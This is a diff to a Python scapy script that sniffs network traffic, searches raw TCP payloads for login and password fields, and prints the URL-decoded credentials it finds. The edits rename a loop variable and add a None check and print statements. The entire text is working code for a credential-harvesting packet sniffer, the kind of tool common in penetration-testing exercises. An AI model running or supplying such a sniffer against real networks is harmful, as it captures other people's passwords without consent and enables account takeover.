@@ -23,8 +23,8 @@ def get_login_pass(body):
         login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
         if login_re:
             user = login_re.group()
-    for pass_field in passfields:
-        pass_re = re.search('(%s=[^&]+)' % pass_field, body, re.IGNORECASE)
+    for passfield in passfields:
+        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
         if pass_re:
             passwd = pass_re.group()
 
@@ -35,7 +35,13 @@ def get_login_pass(body):
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
-        username, password = get_login_pass(body)
+        user_pass = get_login_pass(body)
+        if user_pass != None:
+            print(packet[TCP].payload)
+            print(parse.unquote(user_pass[0]))
+            print(parse.unquote(user_pass[1]))
+    else:
+          pass
 
 try:
     sniff(iface=iface, prn=pkt_parser, store=0)
